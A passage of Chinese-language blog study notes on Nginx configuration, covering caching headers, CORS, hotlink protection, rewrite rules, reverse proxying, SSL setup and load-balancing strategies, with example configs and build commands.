no-store			不缓存请求或响应的任何内容
no-transform		代理不可更改媒体类型
public				可向任意方提供响应缓存
private				可向特定用户提供响应缓存
proxy-revalidate	要求中间缓存服务器对缓存的响应有效性再次确认
max-age=<seconds>	最大响应缓存Age时间
s-maxage=<seconds>	公共缓存服务器响应的最大Age值
```

##### 指令配置

```nginx
location ~ .*\.(html|js|css|png)${
    add_header Cache-Control no-store;
}
```

## Nginx跨域问题解决

### 浏览器同源策略

浏览器的一种约定策略, 将协议、域名(IP)、端口相同的请求称为同源请求. 

### 跨域问题

即存在两台服务器A, B. 如果从A的页面发送异步请求到B获取数据, 如果服务器A和B不满足同源策略, 就会出现跨域问题

### 跨域演示

新建nginx配置server

```nginx
server {
    listen 8081;
    server_name test.project.com;
    location / {
        root /var/www/test;
        index index.html;
    }
}
server {
    listen 8082;
    server_name localhost;
    location / {
        root /var/www/test/another;
        index index.html index.php;
    }
}
```

新建/var/www/test/index.html文件

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>跨域演示</title>
	<script src="jquery.js"></script>
</head>
<body>
	<input type="button" name="bt" value="获取跨域数据" id="btn">
</body>
<script type="text/javascript">
	$(function(){
		$("#btn").click(function(){
			$.get('http://192.168.253.134:8082/getUser', function(data){
				alert(JSON.stringify(data));
			})
		});
	});
</script>
</html>
```

请求结果如下:

![image-20211120023920588](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120023920588.png)

### 跨域解决方案

使用Nginx指令add_header 添加响应头信息

```
需要添加两个信息:
Access-Control-Allow-Origin		# 允许访问域名, 可配置多个,逗号分隔, 或 * 代表所有 
Access-Control-Allow-Methods	# 允许访问方式, 可配置多个,逗号分隔
```

如修改上述案例的nginx配置如下

```nginx
server {
    listen 8081;
    server_name test.project.com;
    location / {
        root /var/www/test;
        index index.html;
    }
}
server {
    listen 8082;
    server_name localhost;
    location / {
        add_header Access-Control-Allow-Origin http://test.project.com:8081;
        add_header Access-Control-Allow-Methods *;
        root /var/www/test/another;
        index index.html index.php;
    }
}
```

重新请求结果如下:

![image-20211120024917471](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120024917471.png)

## 静态资源防盗链

**资源盗链**: 将不在自己服务器上的静态资源通过技术手段, 绕过限制放置到自己的页面上展示给用户, 依次盗取大网站的空间和流量

如下所示代码:

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>盗链演示</title>
</head>
<body>
	<img src="https://m.360buyimg.com/babel/jfs/t1/169821/25/23076/279367/6191c359E738f3e96/64e56f4355e3cd20.gif">
</body>
</html>
```

### 实现原理

使用HTTP请求头中的`Referer` , 获取来源网站地址是否为信任地址, 若是则放行访问, 若不是则返回403(拒绝访问)状态码

使用Nginx指令`valid_referers` 实现匹配

### 指令格式

`valid_referers none|blocked|server_names|string ...`

```
指令valid_referers会通过匹配Referer和配置后面的内容, 将结果赋给变量$invalid_referer, 若匹配成功, 该值等于0, 匹配失败, 该值等于1, 匹配时不区分大小写
```

```
none: 如果Header中的Referer为空, 允许访问
blocker: Header中的Referer不为空, 但该值被防火墙或代理伪装过, 如不带http:// https://等协议头, 允许访问
server_names: 具体的域名或IP
string: 支持正则表达式和*的统配符表达式如: *.example.com  ~.*\.google\..*
```

### Nginx配置实例

```nginx
location ~ ^.*\.(png|jpg|gif)$ {	# 针对文件类型防盗链
    valid_referers none blocked www.baidu.com;
    if ($invalid_referer) {
        return 403;
    }
}

location /images {	# 针对目录防盗链
    valid_referers none blocked www.baidu.com;
    if ($invalid_referer) {
        return 403;
    }
    root /var/www/test;
}
```

### 效果展示 

![image-20211120042313902](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120042313902.png)

### 通过模块精细化设置

需要使用Nginx模块 `ngx_http_accesskey_module` ]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx配置指令Rewrite04</title>
    <url>/2021/06/21/Nginx/Nginx04%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4Rewrite/</url>
    <content><![CDATA[
# Nginx配置指令Rewrite

## Rewrite功能配置

Rewrite功能是Nginx服务器提供的一个重要基本功能, 主要用于实现URL的重写. 其具体实现需要依赖PCRE的支持, Nginx通过 `ngx_http_rewrite_module` 模块解析处理Rewrite功能相关配置

```
文档: http://nginx.org/en/docs/http/ngx_http_rewrite_module.html
```

### Rewrite相关命令

#### set

> 用于设置一个Nginx变量, 可用于 server/location/if 块中

##### 指令格式

`set $variable value`

variables: 变量的名称. 该变量名要用 `$` 作为变量开头, 且不能与nginx全局变量同名

value: 变量的值.

##### Nginx常用全局变量

```
请求: http://192.168.200.133/server?arg1=value1&arg2=value2
```

| 变量名             | 说明                                                         |
| ------------------ | ------------------------------------------------------------ |
| $args              | 请求URL中参数, 功能与 `$query_string` 一样<br />"`arg1=value1&arg2=value2`" |
| $http_user_agent   | 用户访问客户端或代理的信息, 同`Request Headers->User-Agent`  |
| $host              | 服务器的`server_name` 值<br />"`192.168.200.133`"            |
| $document_uri      | 当前访问地址的URI, 功能与 `$uri` 一样<br />"`/server`"       |
| $content_length    | 请求头中的 `Content-Length` 值                               |
| $content_type      | 请求头中的 `Content-Type` 值                                 |
| $http_cookie       | 客户端的cookie信息                                           |
| $limit_rate        | Nginx服务器对网络连接速率的限制, 默认为0, 不限制             |
| $remote_addr       | 客户端的IP地址                                               |
| $remote_port       | 客户端与服务端连接的端口号                                   |
| $remote_user       | 客户端的用户名, 需要认证模块                                 |
| $scheme            | 访问协议                                                     |
| $server_addr       | 服务端的地址                                                 |
| $server_name       | 服务端的名称                                                 |
| $server_port       | 服务端的端口                                                 |
| $server_protocol   | 客户端请求协议版本                                           |
| $request_body_file | 发给服务器的本地资源名称                                     |
| $request_method    | 客户端的请求方式                                             |
| $request_filename  | 当前请求资源文件的路径名                                     |
| $request_uri       | 当前请求的URI, 且携带请求参数<br />"`/server?arg1=value1&arg2=value2`" |

#### if

> 用于支持条件判断, 根据不同记过选择不同Nginx配置, 可用于server/location 块中

##### 指令格式

`if (condition){...}`		

注意: if后必须带一个空格

condition: 判定条件, 支持一下写法:

```
1.变量名. 如果变量对应值为空字符串或0, if判断都为false, 其余情况均为true
	if ($param){}
2.使用 = 和 != 比较变量和字符串, 满足为true, 不满足为false(字符串不需要引号)
	if ($request_method = POST){return 405;}
3.使用正则表达式匹配, 匹配成功为true,匹配失败为false, 以 ~ | ~* | !~ | !~* 开头
	if ($http_user_agent ~ Safari){return 200 Chrome;}
4.使用 -f | !-f 判断请求静态文件是否存在
	if (!-f $request_filename){return 200 "file $request_filename not found";}
5.使用 -d | !-d 判断请求目录是否存在
6.使用 -e | !-e 判断请求的文件或目录是否可用
7.使用 -x | !-x 判断请求的文件是否可执行
```

#### break

> 1.用于中断当前作用域的其他nginx配置. 在同一作用域中, break之后的配置不再执行生效
>
> 2.终止当前匹配并将当前URI在本location中进行301重定向访问

##### 指令格式

`break;`

##### 使用案例

访问: `http://test.project.com:8081/testbreak`

```nginx
location /testbreak{
    root /var/www/test;
    index break.html;
    default_type text/plain;
    set $username number1;
    if ($username){
        set $username number2;
        break;	
        # 终止匹配并跳转至路由 http://test.project.com:8081/testbreak/break.html
        set $username number3;
    }
    add_header username $username;
    return 200 $username;
}
```

```
同时创建目录 /var/www/test/testbreak, 创建文件 /var/www/test/testbreak/break.html 
```

显示结果如下, break不仅中断了本作用域的 `set $username number3;` 配置, 而且301永久重定向到了本location下的root+index配置页面

![image-20211120064013787](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120064013787.png)



#### return

> 用于完成对请求的处理, 直接向客户端返回. 在return后的所有Nginx配置都无效

##### 指令格式

`return code [text];  || return code URL; || return URL;`

code: 返回客户端的HTTP状态, 0-999

text: 返回客户端的响应体内容, 支持变量使用

URL: 返回给客户端的URL地址 (302跳转)

```nginx
location /testreturn{
	# return 200 success;
    # return https://www.baidu.com;
    return 302 https://www.baidu.com;
}
```

#### rewrite

> 通过正则表达式改变URI. 可以同时存在多个指令, Nginx按照顺序依次执行匹配

##### 指令格式

`rewrite regex replacement [flag]` 

regex: 用来匹配URI的正则表达式

replacement: 匹配成功后, 用于替换URI内容的字符串. 若该配置以 `http://` 或 `https://` 开头, 则不会继续执行其他rewrite, 直接返回重写后的URI给客户端

flag: 用于设置rewrite对URI的处理行为, 有如下值:

```
last - 终止继续在本location块中处理接收到的URI, 并将此处重写的URI作为一个新的URI, 使用各location块进行处理. 该标识将重写后的URI重新载server块中执行, 为重写后的URI提供了在其他location块中执行的机会, 不会修改当前浏览器的URL

break - 将此处重写的URI作为一个新的URI, 在本location块中继续处理. 该标识将重写后的地址在当前location中执行(root+index), 不会将新的URI转向其他location块, 不会修改当前浏览器的URL

redirect - 将重写后的URI返回给客户端, 状态码为302, 指明是临时重定向, 主要用于replacement不是以http:// 或 https:// 开头的情况. 会修改当前浏览器的URL

permanent - 将重写后的URI返回给客户端, 状态码为301, 指明是永久重定向, 主要用于replacement不是以http:// 或 https:// 开头的情况. 会修改当前浏览器的URL
```

##### 使用案例

```nginx
location /rewrite{
    # rewrite ^/rewrite/url\w*$ https://www.baidu.com;
    rewrite ^/rewrite/(test)\w*$ /$1;
    rewrite ^/rewrite/(demo)\w*$ /$1;
}

location /test{
    default_type text/plain;
    return 200 success_test;
}
location /demo{
    default_type text/plain;
    return 200 success_demo;
}
```

访问 `http://test.project.com:8081/rewrite/urlxxx`

![image-20211120074841710](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120074841710.png)

访问 `http://test.project.com:8081/rewrite/testxxx`

![image-20211120074744772](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120074744772.png)

#### rewrite_log

> 开启URL重写日志的输出功能, 可用于http/server/location/if

##### 指令语法

`rewrite_log on|off;`

开启后,URL重写日志将会以notice级别输出到error_log中

```nginx
rewrite_log on;
error_log /var/log/nginx/error.log notice;  # 需要设置默认日志级别
```

日志数据如下:

![image-20211120075013711](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120075013711.png)

### Rewrite应用场景

#### 域名跳转

访问京东商城, 可以使用`www.jd.com` , 也可以使用`www.360buy.com` , 除了单server块指定多`server_name`外, 还可以利用Rewrite实现该效果

```
准备三个域名
192.168.253.134 test.project.com
192.168.253.134 test1.project.com
192.168.253.134 test2.project.com
```

编写nginx配置文件

```nginx
server{
    listen 80;
    server_name test.project.com;
    location /{
        default_type text/plain;
        return 200 'test.project.com page';
    }
}

server{
    listen 80;
    server_name test1.project.com test2.project.com;
    # rewrite ^/ http://test.project.com;	# 无法携带URI
    rewrite ^(.*) http://test.project.com$1;
}
```

访问域名 `http://test1.project.com/getUser/id?test=111`

![](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120122634521.png)

#### 独立域名

一个完整项目包含多个模块, 如何为每个模块设置独立域名

```
需求为:
http://test1.project.com 访问搜索模块 /search
http://test2.project.com 访问详情模块 /detail
http://test3.project.com 访问列表模块 /list
```

编写nginx配置文件

```nginx
server{
    listen 80;
    server_name test.project.com;
    default_type text/plain;
    location /{
        return 200 'test.project.com index page';
    }
    location /search{
        return 200 'test.project.com search page';
    }
    location /detail{
        return 200 'test.project.com detail page';
    }
    location /list{
        return 200 'test.project.com list page';
    }
}

server{
    listen 80;
    server_name test1.project.com;
    rewrite ^(.*) http://test.project.com/search$1;
}

server{
    listen 80;
    server_name test2.project.com;
    rewrite ^(.*) http://test.project.com/detail$1;
}

server{
    listen 80;
    server_name test3.project.com;
    rewrite ^(.*) http://test.project.com/list$1;
}
```

访问效果如下

![image-20211120123838920](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120123838920.png)

![image-20211120123933761](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120123933761.png)

![image-20211120124019223](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120124019223.png)



#### 域名镜像

域名跳转部分中, 我们将`test1.project.com`和`test2.project.com` 均跳转到`test.project.com`, 即两个备份域名跳转到主域名, 如果不想把整个网站都做镜像, 仅为其中一个子目录下的资源做镜像, 可以在location块中配置Rewrite实现

```nginx
server{
    listen 80;
    server_name test.project.com;
    default_type text/plain;
    location /{
        return 200 'test.project.com index page';
    }
    location /user{
        return 200 'test.project.com user module page';
    }

}

server{
    listen 80;
    default_type text/plain;
    server_name test1.project.com test2.project.com;
    location /user{
        rewrite ^(/user.*)$ http://test.project.com$1;
    }
    location /goods{
        return 200 'goods page';
    }
}

```

访问效果如下:

![image-20211120125424948](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120125424948.png)

![image-20211120125634725](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120125634725.png)



#### 目录自动添加"/"

创建nginx配置如下

```nginx
root /var/www/test;
index index.html;
# server_name_in_redirect on;
server{
    listen 8088;
    server_name localhost;
    default_type text/plain;
    location /goods{
        
    }
}

```

访问网址 `http://test.project.com/goods`, 显示如下:

![image-20211120131411135](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120131411135.png)

可见可以访问, 但实际上是nginx做了301转发, 实际是去找`root+index` 文件展示出来

```
nginx配置中的server_name_in_redirect, 在Nginx 0.8.48版本之前, 默认为on, 之后为off

当server_name_in_redirect等于on时,访问使用server_name替换请求host, 即访问的是
	http://192.168.253.134:8088/goods -> http://localhost:8088/goods/
当server_name_in_redirect等于off时, 正常转发, 只在后面加了 / 符号
```

可以通过Rewrite在URI后面手动加`/`解决问题

修改nginx配置为:

```nginx
root /var/www/test;
index index.html;
server_name_in_redirect on;
server{
    listen 8088;
    server_name localhost;
    default_type text/plain;
    location /goods{
        if (-d $request_filename){
            rewrite ^/(.*)([^/])$ http://$host:$server_port/$1$2/ permanent;
        }
    }
}
```

即可正常访问

#### 合并目录

SEO要求包含URL的目录层级不要超过三层, 可以使用Rewrite简化输入目录层级

如: 需要访问服务器中的URI`/server/11/22/33/44/55.html`, 则完整URL应该是`http://test.project.com/server/11/22/33/44/55.html`, 在Rewrite后可以访问`http://test.project.com/server-11-22-33-44/55.html` 达成同样效果

```nginx
server{
    root /var/www/test;
    listen 80;
    server_name test.project.com;
    default_type text/plain;
    location /server{
        rewrite ^/server-([0-9]+)-([0-9]+)-([0-9]+)-([0-9]+)/(.*)$ /server/$1/$2/$3/$4/$5 last;
    }
}
```

访问效果如下

![image-20211120134903700](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/image-20211120134903700.png)

#### 防盗链

当访问来源非授权时, 可以通过Rewrite到一张自定义图片资源上

```nginx
location /images{
    valid_referers none blocked www.baidu.com;
    if (invalid_referer){
        rewrite ^/ /images/forbidden.png break;
    }
}
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx反向代理05</title>
    <url>/2021/06/21/Nginx/Nginx05%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[
## Nginx反向代理

### 概述

正向代理的代理对象是客户端, 而反向代理的代理对象是服务端

![image-20211215160706151](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9e026fcf5b2b4ea8b4084772e48d07c6-1a51656.png)

### 正向代理实战

![image-20211215181140687](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a9f5c90926eef4bdbc3dba6a259dd0a7-3e62cb1.png)

#### 配置134服务器

##### nginx服务

```nginx
http {
    include mime.types;
    default_type application/octet-stream;
    keepalive_timeout 65;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
    log_format proxy 'client send request from $remote_addr to $host';
    server{
        root /var/www/test;
        listen 80;
        default_type text/plain;
        access_log /var/log/nginx/access.log proxy;
    }
    include /etc/nginx/sites-enabled/*;
}
```

##### 访问页面结果

![image-20211215181811763](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/12d88879a995b41864d927e53077bdfd-a0e6e16.png)

##### 监控访问日志

![image-20211215181916864](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/29ff51219e6b274e9edbd04ed5803113-741d8c5.png)

#### 配置135代理服务器

##### nginx服务

```nginx
    server{
        listen 82;
        location /{
            # resolver 8.8.8.8; # 用于设置解析proxy_pass中域名
            proxy_pass http://$host$request_uri;
        }
    }
```

##### 客户端设置代理

![1200628e43314ad0d024781-5faa8fe](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e56225e7e1200628e43314ad0d024781-5faa8fe.png)

##### 监控访问日志

![image-20211215182241957](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9111c7b40b466f112f83c9517581f792-de930ed.png)

### 反向代理配置语法

Nginx反向代理由nginx自带模块ngx_http_proxy_module进行解析, 常见指令包括

```
proxy_pass
proxy_set_header
proxy_redirect
```

```
文档: http://nginx.org/en/docs/http/ngx_http_proxy_module.html
```

#### proxy_pass

用于设置被代理服务器地址, 可以为主机名称、IP+端口号

语法: `proxy_pass URL;`

位置: location块

>  URL为要设置的被代理的服务器地址, 包含协议(`http://`, `https://`)、主机名称或IP+端口

```
proxy_pass http://www.baidu.com;
proxy_pass http://192.168.253.134/;
```

##### 是否需要加/

```nginx
server{
    listen 80;
    server_name localhost;
    location /{
        # proxy_pass http://192.168.253.134;
        proxy_pass http://192.168.253.134/;
    }
}
# 客户端访问 http://localhost/index.html 时, 显示访问结果一样
```

```nginx
server{
    listen 80;
    server_name localhost;
    location /server{
        # proxy_pass http://192.168.253.134;
        proxy_pass http://192.168.253.134/;
    }
}
# 客户端访问 http://localhost/server/index.html 时
# 第一个配置会访问 http://localhost/server/index.html
# 第二个配置会访问 http://localhost/index.html
```

> 配置proxy_pass时，当在后面的url加上了/，相当于是绝对根路径，则nginx不会把location中匹配的路径部分代理走;如果没有/，则会把匹配的路径部分也给代理走

#### proxy_set_header

用于更改Nginx代理服务器收到的客户端的请求头信息,并将新的请求头信息发送给被代理服务器

语法: `proxy_set_header field value;`

默认值: `proxy_set_header Host $proxy_host;  proxy_set_header Connection close;`

位置: http server location 块

##### 案例:获取客户端IP

> 想要获取客户端的真实IP而不是代理服务器IP

代理服务器配置(192.168.253.135)

```nginx
    server{
        listen 80;
        location /{
            # resolver 8.8.8.8; # 用于设置解析proxy_pass中域名
            proxy_pass http://192.168.253.134/;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    }
```

被代理服务器配置(192.168.253.134)

```nginx
    server{
        root /var/www/test;
        listen 80;
        default_type text/plain;
        access_log /var/log/nginx/access.log proxy;
        location /{
            return 200 "$http_host==>$http_x_real_ip==>$http_x_forwarded_for";
        }
    }
```

访问代理服务器 `http://192.168.253.135/`

![image-20211215191626909](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/acb42374e4cc50cc8561de13929e150a-b132ded.png)

#### proxy_redirect

用于重置头信息中的 Location 和 Refresh 信息

语法: `proxy_redirect redirect replacement; | proxy_redirect default; | proxy_redirect  off;  ` 

默认值: `default`

位置: http server location 块

设置被代理服务器(192.168.253.134)

```nginx
    server{
        root /var/www/test;
        listen 8081;
        if (!-f $request_filename){
            return 302 http://192.168.253.134;
        }
    }
    server{
        root /var/www/test;
        listen 80;
    }
```

设置代理服务器(192.168.253.135)

```nginx
    server{
        listen 8081;
        location /{
            proxy_pass http://192.168.253.134:8081/;
           	proxy_redirect http://192.168.253.134/ http://192.168.253.135/;
        }
    }
    server{
        listen 80;
        location /{
            proxy_pass http://192.168.253.134/;
        }
    }
```

> 从而避免暴露被代理服务器

### 反向代理实战

![image-20211215212251372](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c89567916c57a4242641de48cfecc683-b15bfa1.png)

#### 配置代理服务器(134)

```nginx
    server{
        listen 80;
        server_name localhost;
        location /server1{
            proxy_pass http://192.168.253.135/;
        }
        location /server2{
            proxy_pass http://192.168.253.136/;
        }
        location /server3{
            proxy_pass http://192.168.253.137/;
        }
    }
```

#### 配置被代理服务器(135 136 137)

```nginx
    server{
        listen 80;
        server_name localhost;
        location /{
            default_type text/plain;
            return 200 '192.168.253.135';
        	# return 200 '192.168.253.136';
        	# return 200 '192.168.253.137';
        }
    }
```

#### 访问结果如下

![image-20211215213813825](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e0c09d474fcf786c4eb8e795ee43150a-42e85d2.png)

### 反向代理系统优化

利用缓冲区Buffer和缓存Cache提升IO吞吐效率

```
缓冲主要用于解决不同设备间数据传输速度不一致, 导致性能低下的问题, 缓冲中的数据完成操作后删除
缓存主要用于备份, 当客户端再次获取相同数据时, 可以从代理服务器上获取, 满足特定条件后删除
```

#### Proxy Buffer指令

- proxy_buffering: 用于开启或关闭代理服务缓冲区

  语法: `proxy_buffering on|off;` 

  默认值: `on` 

- proxy_buffers: 用于指定单个连接从代理服务器读取响应的缓冲区个数和大小

  语法: `proxy_buffers number size;` 

  默认值: `8 4k` (与平台有关) 

- proxy_buffer_size: 用于设置从被代理服务器获取的第一部分响应数据大小

  语法: `proxy_buffer_size size;`

  默认值: `4k|8K` (与平台有关)

  > 保持与proxy_buffers中size相同即可

- proxy_busy_buffers_size: 用于限制同时处于BUSY状态的缓冲区总大小

  语法: `proxy_busy_buffers_size size;`

  默认值: `8k|16k` 

- proxy_temp_path : 当缓冲区满后, 仍未被nginx服务器完全接受, 响应数据就会被临时存放在磁盘上

  语法: `proxy_temp_path path;`

   默认值: `proxy_temp` 

  > path 最大目录深度为3层

- proxy_temp_file_write_size: 用于设置磁盘上缓冲文件大小

  语法: `proxy_temp_file_write_size size;`

  默认值: `8k|16k` 

#### 通用配置

```nginx
proxy_buffering on;
proxy_buffer_size 4 32k;
proxy_busy_buffers_size 64k;
proxy_temp_file_write_size 64k;
```

### 使用OpenSSL生成证书文件

```
mkdri /root/cert
cd /root/cert
openssl genrsa -des3 -out server.key 1024
# 设定密码
openssl req -new -key server.key -out server.csr
# 输入密码, 验证信息
cp server.key server.key.org
openssl rsa -in server.key.org -out server.key
# 验证密码
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
```

生成文件: server.key | server.crt

### 开启SSL实例

详细官方文档: `https://nginx.org/en/docs/http/ngx_http_ssl_module.html` 

```nginx
server{
    # ssl on;
    listen 443 ssl;
    server_name localhost;
    
    ssl_certificate server.crt;	# 指定证书文件路径
    ssl_certificate_key server.key;	# 指定证书key文件路径
    
    ssl_session_cache shared:SSL:1m;	# 配置用于SSL会话缓存
    # off-禁用, 客户端不得重复使用会话
    # none-禁用, 客户端可以重复使用, 但并没有在缓存中存储会话参数
    # builtin-内置OpenSSL缓存,仅在一个工作进程中使用
    # shared-所有工作进程间共享缓存, 相关信息由name和size指定
    ssl_session_timeout 5m;	# 开启会话后,客户端能够反复使用存储会话时间
    
    ssl_ciphers HIGH:!aNULL:!MD5;	# 允许密码格式,可以用openssl ciphers查看支持格式
    ssl_prefer_server_ciphers on;	# 指定是否服务器密码优先于客户端密码
    
    location /{
        root html;
        index index.html index.htm;
    }
}
```

#### 自动转换为https协议

```
location /{
	...
	rewrite ^(.*) https://[server_name]$1;
}

或

server {
    if ($host = [server_name]) {
        return 301 https://$host$request_uri;
    }
}
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx负载均衡06</title>
    <url>/2021/06/21/Nginx/Nginx06%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[
## 负载均衡

将用户请求根据对应的算法, 分发到集群中的一台服务器上进行处理

### 作用

- 提升并发处理能力

- 提高单点故障宕机容错能力, 实现高可用

- 通过添加或减少服务器数量, 增强可扩展性

- 在负载均衡器上进行过滤, 提高系统安全性

### 常用实现方式

#### 用户手动选择

比较原始的方式, 即提供不同线路, 由用户自己选择访问服务器

#### DNS轮询

由域名注册商解析同一域名到多主机IP, 随机访问不同IP, 也可以实现简单的负载均衡

但存在可靠性低(DNS缓存), 不均衡的问题

#### 四/七层负载均衡

开放式系统互联模型 - OSI(open system interconnection)

![image-20211217232125273](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b3a8204c69af08b5271c14168c42e524-0843c75.png)

##### 四层负载均衡(传输层)

基于IP+Port实现, 包括硬件和软件实现方式:

- 硬件: F5 BIG-IP 、Radware等
- 软件: LVS、Nginx、Hayproxy等

##### 七层负载均衡(应用层)

基于虚拟的URL或主机IP实现

- 软件: Nginx、Hayproxy等

>  四层负载均衡数据是在底层就进行分发, 而七层负载均衡则是在最顶端分发, 所以四层负载均衡效率更高
>
> 四层负载均衡不识别域名, 而七层负载均衡识别域名
>
> 一般实际环境使用四层负载(LVS) + 七层负载均衡(Nginx)

### Nginx七层负载均衡

需要使用proxy_pass代理模块, 在反向代理的基础上将用户请求根据指定算法分发到[upstream虚拟服务池]

#### 指令

##### upstram指令

用于定义一组服务器, 可以是不同端口, 也可以是监听TCP和Unix socket的服务器, 权重不指定, 默认为1

```
语法:
	upstream name{...}
位置: 
	http块
```

#####  server指令

用于指定后端服务器的名称及参数, 可以使用域名/IP/端口或Unix socket

```
语法:
	server name[parameters]
位置: 
	upstream
```

#### 实现流程

![image-20220603230545450](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1c25ebb2b08f3346e7b1c79fc0863c12-3f2ab7f.png)

```nginx
# 配置负载均衡服务器 192.168.253.134
http {
    ...
	upstream serverpool{
		server 192.168.253.135;
		server 192.168.253.136;
		server 192.168.253.137;
	}
    server{
        listen 80;
        server_name test.project.com;
        location /{
            proxy_pass http://serverpool;
        }
    }
}

# 配置服务端服务器 192.168.253.135 / 192.168.253.136 / 192.168.253.137
http {
    ...
    server{
        listen 80;
        server_name localhost;
        location /{
            default_type text/plain;
            return 200 '<h1>192.168.253.137</h1>';
        }
    }
}
```

#### 实现结果

![image-20211218190642925](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0b9c5ff60cf3ea29e96566ed58d7f8e1-d6f6303.png)

#### 负载均衡状态

| 状态         | 概述                                |
| ------------ | ----------------------------------- |
| down         | 当前server不参与服务                |
| backup       | 预留备份服务器                      |
| max_fails    | 允许请求失败次数, 默认1             |
| fail_timeout | 请求失败后, 服务暂停时间, 默认10s   |
| max_conns    | 限制最大的接收连接数, 默认0, 不限制 |

```nginx 
upstream serverpool{
    server 192.168.253.135 down;
    server 192.168.253.136 backup;
    server 192.168.253.137 max_fails=3 fail_timeout=15;
}
```

> 使用配置之后, 由于浏览器缓存问题, 可能出现仍然访问到135服务器的状况, 可以用curl请求验证配置生效

![image-20220604005521986](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ecd73e9165a916a644f6aaf315f7e164-5ef3311.png)

#### 负载均衡策略

Nginx的upstream支持六种分配算法, 分别是:

| 算法       | 概述               |
| ---------- | ------------------ |
| 轮询       | 默认方式, 无需配置 |
| weight     | 依权重点数分配     |
| ip_hash    | 依据IP分配         |
| least_conn | 最少连接分配       |
| url_hash   | 依据URL分配        |
| fair       | 依响应时间分配     |

##### 轮询策略

不做任何配置,  默认就是使用轮询策略

##### weight加权

也叫加权轮询, 使用`weight=number`设置server服务器的权重, 权重越大, 分配到的概率就越大, 主要是为了针对工作环境中不同配置的服务器配置

```nginx
upstream serverpool{
    server 192.168.253.135 weight=10;
    server 192.168.253.136 weight=5;
    server 192.168.253.137 weight=5;
}
```

##### ip_hash策略

通过请求客户端的IP,所计算出的哈希值定位到同一后端服务器上, 之后该客户端的请求均访问同一服务器, 可以解决用户session共享问题, 但无法保证后端服务器的负载均衡, 且设置后权重等配置将失效

```nginx
upstream serverpool{
    ip_hash;
    server 192.168.253.135;
    server 192.168.253.136;
    server 192.168.253.137;
}
```

##### least_conn策略

将请求转发给连接数较少的后端服务器上, 可以避免某些占用时间长的请求, 连续分发到同一服务器上, 达到更好的负载均衡效果

```nginx
upstream serverpool{
    least_conn;
    server 192.168.253.135;
    server 192.168.253.136;
    server 192.168.253.137;
}
```

##### url_hash策略

通过用户访问URL的哈希计算结果来分配请求访问目标, 使每一个URL定向到同一个后端服务器, 使其提高**缓存命中率**, 避免不必要的资源下载

```nginx
upstream serverpool{
    hash $request_uri;
    server 192.168.253.135;
    server 192.168.253.136;
    server 192.168.253.137;
}
```

##### fair策略

依据客户端请求页面大小、加载时间长短智能分发. 但不是nginx内建均衡算法, 需要引入第三方模块

```nginx
upstream serverpool{
    fair;
    server 192.168.253.135;
    server 192.168.253.136;
    server 192.168.253.137;
}
```

**添加nginx-upstream-fair模块** 

```shell
# https://github.com/gnosek/nginx-upstream-fair 下载fair压缩包
$ wget https://nginx.org/download/nginx-1.14.0.tar.gz # 对照本机版本下载nginx包
$ unzip nginx-upstream-fair
$ tar -zxvf nginx-1.14.0.tar.gz

$ cd nginx-1.14.0
$ vi src/http/ngx_http_upstream.h	# 打开文件
	/ngx_http_upstream_srv_conf_s	# 找到关键字
	131     in_port_t                        default_port;	# 131行添加内容
$ sudo apt install build-essential libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev libxslt1-dev libgd-dev libgroip-dev	# 安装编译依赖
$ pwd ../nginx-upstream-fair	# 记录下module路径
$ nginx -V	# 复制nginx模块配置
$ ./configure [nginx原有配置] --add-module=[fair-module路径]
$ make
$ sudo mv /usr/sbin/nginx /usr/sbin/nginx_old	# 备份
